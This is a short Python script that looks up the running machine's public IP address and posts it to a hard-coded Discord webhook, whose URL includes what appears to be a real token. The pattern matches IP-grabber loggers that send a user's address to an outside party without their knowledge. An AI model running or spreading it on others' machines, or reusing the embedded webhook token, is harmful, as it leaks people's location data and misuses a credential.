import requests

ip = requests.get("https://api.ipify.org").text

payload = {"content": f"IP Address: {ip}"}

response = requests.post(
    "https://discord.com/api/webhooks/1188219299714826331/r9FpAc5apyOBb5ArEELtL7JfMIj0jvTOBrAcP8gjx7wDozELVOr7QaHL9ivTgu_opipu",
    json=payload,
)
if response.status_code == requests.codes.ok:
    print("Message sent successfully")
else:
    print("Message sent unsucessfully.")
